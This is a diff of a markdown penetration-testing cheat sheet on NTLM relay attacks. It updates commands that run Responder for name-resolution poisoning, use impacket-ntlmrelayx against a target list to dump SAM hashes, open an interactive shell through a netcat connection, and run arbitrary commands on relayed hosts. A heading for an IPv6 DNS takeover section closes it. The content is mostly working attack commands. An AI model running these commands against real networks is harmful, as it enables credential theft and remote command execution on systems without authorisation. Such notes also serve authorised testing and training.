@@ -19,21 +19,21 @@ Turn on responder
 ```bash
 sudo Responder -I <iface> -dwp
 ```
-Create a targets.txt file (List of all relay attack targets.
+Create a targets.txt file (List of all relay attack targets. Just a list of IP address. (1 per line)
 
-Capture hashes
+Dump SAM
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
 Open a shell
 ```bash
 nc 127.0.0.7 11000 #Open a netcat listener
 
-sudo ntlmrelayx.py -tf targets.txt -smb2support -i
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -i
 ```
 Run a command
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command"
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c "<command"
 ```
 
 ### IPv6 DNS TakeOver
